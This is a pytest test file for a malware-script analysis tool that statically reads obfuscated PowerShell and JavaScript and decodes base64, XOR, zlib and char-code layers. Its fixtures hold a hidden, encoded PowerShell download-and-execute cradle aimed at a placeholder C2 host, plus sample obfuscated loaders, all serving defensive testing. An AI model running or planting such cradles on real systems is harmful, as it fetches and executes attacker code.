"""Static script reading and layer-by-layer decoding (reverse_read_script,
reverse_decode_layer). Nothing may execute the script."""

from __future__ import annotations

import base64
import gzip
import json
import subprocess
import zlib
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from mulder.reverse import scripts
from mulder.reverse.backend import BackendError

_IEX = "IEX (New-Object Net.WebClient).DownloadString('http://c2.example.invalid/a')"


def _enc_command(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


def _call(name: str, **kwargs: Any) -> dict[str, Any]:
    from mulder.server.app import _tool_dispatch_sync

    return _tool_dispatch_sync[name](**kwargs)  # type: ignore[no-any-return]


@pytest.fixture()
def case(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    from mulder.server.app import init_server

    evidence = tmp_path / "evidence"
    evidence.mkdir()
    init_server(db_dir=tmp_path / "cases")
    r = _call("scan_evidence", evidence_path=str(evidence), case_id="scripts")
    assert r["status"] == "success", r

    def _no_exec(*_a: object, **_k: object) -> object:
        raise AssertionError("a script tool tried to start a process")

    monkeypatch.setattr(subprocess, "Popen", _no_exec)
    monkeypatch.setattr(subprocess, "run", _no_exec)
    yield evidence


# -- module ----------------------------------------------------------------------


def test_utf16_script_is_read_as_text(tmp_path: Path) -> None:
    p = tmp_path / "a.ps1"
    p.write_bytes(b"\xff\xfe" + "Write-Host 'hi'\r\n$x = 1".encode("utf-16-le"))
    text, enc = scripts.read_script_text(p)
    assert enc == "utf-16-le"
    assert text.startswith("Write-Host 'hi'")
    assert scripts.script_language(p, text) == "powershell"


def test_binary_and_oversized_files_are_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    p = tmp_path / "x.bin"
    p.write_bytes(bytes(range(256)) * 8)
    with pytest.raises(BackendError, match="looks binary"):
        scripts.read_script_text(p)
    monkeypatch.setattr(scripts, "MAX_SCRIPT_BYTES", 10)
    q = tmp_path / "big.js"
    q.write_text("var a = 1; var b = 2;")
    with pytest.raises(BackendError, match="not read"):
        scripts.read_script_text(q)


def test_indicators_cover_the_usual_encodings() -> None:
    text = (
        f"powershell -nop -w hidden -ExecutionPolicy Bypass -ec {_enc_command(_IEX)}\n"
        "var u = String.fromCharCode(104,116,116,112,58,47,47,99,50,46,105,110);\n"
        'x = "4d5a90000300000004000000ffff0000b800000000000000400000000000";\n'
        "var myVeryLongButInnocentVariableNameWithoutAnyDigitsInIt = 3;\n"
    )
    kinds = [(i.kind, i.line) for i in scripts.find_indicators(text)]
    assert kinds == [("powershell_encoded_command", 1), ("char_codes", 2), ("hex", 3)]


def test_encoded_command_decodes_from_utf16() -> None:
    blob = _enc_command(_IEX)
    raw, steps = scripts.decode_indicator(blob, "powershell_encoded_command")
    assert raw.decode() == _IEX
    assert steps == ["base64", "utf-16le"]


def test_xor_then_deflate() -> None:
    payload = zlib.compress(b"secret config: c2.example.invalid")
    xored = bytes(b ^ 0x5A for b in payload)
    raw, steps = scripts.decode_indicator(
        base64.b64encode(xored).decode(), "base64", "base64", "5a"
    )
    assert raw == b"secret config: c2.example.invalid"
    assert steps == ["base64", "xor 0x5a", "zlib"]


def test_decompression_bomb_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(scripts, "MAX_LAYER_BYTES", 1000)
    bomb = base64.b64encode(zlib.compress(b"\0" * 100_000)).decode()
    with pytest.raises(BackendError, match="inflates past"):
        scripts.decode_indicator(bomb, "base64")


@pytest.mark.parametrize(
    ("blob", "kind", "encoding", "key", "message"),
    [
        ("!!notbase64!!", "base64", "base64", "", "Not valid base64"),
        ("zz", "hex", "hex", "", "Not valid hex"),
        ("QUJD", "base64", "rot13", "", "encoding must be"),
        ("QUJD", "base64", "base64", "xyz", "xor_key must be hex"),
    ],
)
def test_bad_decoding_requests(
    blob: str, kind: str, encoding: str, key: str, message: str
) -> None:
    with pytest.raises(BackendError, match=message):
        scripts.decode_indicator(blob, kind, encoding, key)


# -- tools -------------------------------------------------------------------------


def test_read_script_pages_and_lists_indicators(case: Path) -> None:
    script = case / "dropper.ps1"
    body = [f"# filler {i}" for i in range(300)]
    body.insert(250, f"powershell -enc {_enc_command(_IEX)}")
    script.write_bytes(b"\xff\xfe" + "\r\n".join(body).encode("utf-16-le"))
    first = _call("reverse_read_script", file_path=str(script), limit=100)
    res = first["results"]
    assert first["status"] == "success"
    assert res["encoding"] == "utf-16-le" and res["language"] == "powershell"
    assert res["total_lines"] == 301 and res["next_offset"] == 100
    assert res["indicators"] == [] and res["indicators_total"] == 1
    assert res["indexed_source"] == "reverse.script"
    third = _call("reverse_read_script", file_path=str(script), offset=200, limit=100)
    inds = third["results"]["indicators"]
    assert [(i["id"], i["line"]) for i in inds] == [(1, 251)]
    assert "indexed_source" not in third["results"]


def test_long_lines_are_cut_and_pages_bounded(case: Path) -> None:
    script = case / "one_line.js"
    script.write_text("var a='" + "A" * 50_000 + "';\n" + "var b = 1;\n" * 10)
    r = _call("reverse_read_script", file_path=str(script), max_line_chars=100)["results"]
    assert "more chars]" in r["lines"][0]
    assert len(r["lines"][0]) < 200
    assert r["returned"] == r["total_lines"] == 12  # the trailing newline ends an empty line


def test_nested_layers_are_saved_with_lineage(case: Path) -> None:
    inner = "var u = String.fromCharCode(104,116,116,112,58,47,47,99,50,46,101,120,46,105,110);"
    stage2 = base64.b64encode(gzip.compress(inner.encode())).decode()
    script = case / "loader.js"
    script.write_text(f'var s = "{stage2}";\neval(decode(s));\n')

    first = _call("reverse_read_script", file_path=str(script))["results"]
    assert first["indicators"][0]["kind"] == "base64"
    layer1 = _call("reverse_decode_layer", file_path=str(script), indicator=1)
    l1 = layer1["results"]
    assert layer1["status"] == "success", layer1
    assert l1["layer_id"] == "L1" and l1["steps"] == ["base64", "gzip"]
    assert l1["kind"] == "text" and l1["parent"] == str(script)
    assert l1["indexed_source"] == "reverse.script_layer"
    assert Path(l1["path"]).read_text() == inner

    # The layer is itself a script: read it, decode its own blob.
    r2 = _call("reverse_read_script", file_path=l1["path"])["results"]
    assert r2["indicators"][0]["kind"] == "char_codes"
    l2 = _call("reverse_decode_layer", file_path=l1["path"], indicator=1)["results"]
    assert Path(l2["path"]).read_text() == "http://c2.ex.in"
    assert l2["parent"] == l1["path"]

    manifest = json.loads((Path(l1["path"]).parent / scripts.LAYERS_MANIFEST).read_text())
    assert [e["layer_id"] for e in manifest] == ["L1"]
    # Decoding the same blob again records nothing new.
    again = _call("reverse_decode_layer", file_path=str(script), indicator=1)["results"]
    assert again["already_recorded"] is True
    hits = _call("search", query="fromCharCode", source="reverse.script_layer")
    assert hits["results"]


def test_binary_layer_points_to_reverse_analyze(case: Path) -> None:
    pe = b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode"
    script = case / "drop.ps1"
    script.write_text(f"$b = [Convert]::FromBase64String('{base64.b64encode(pe).decode()}')\n")
    r = _call("reverse_decode_layer", file_path=str(script), indicator=1)["results"]
    assert r["kind"] == "binary" and r["looks_like"] == "PE executable"
    assert r["path"].endswith(".bin")
    assert "reverse_analyze" in r["next_step"]


def test_decode_layer_errors(case: Path) -> None:
    script = case / "plain.bat"
    script.write_text("@echo off\r\necho hello\r\n")
    r = _call("reverse_decode_layer", file_path=str(script), indicator=1)
    assert r["error_type"] == "not_found"
    r = _call("reverse_decode_layer", file_path=str(case / "none.js"), indicator=1)
    assert r["error_type"] == "file_not_found"
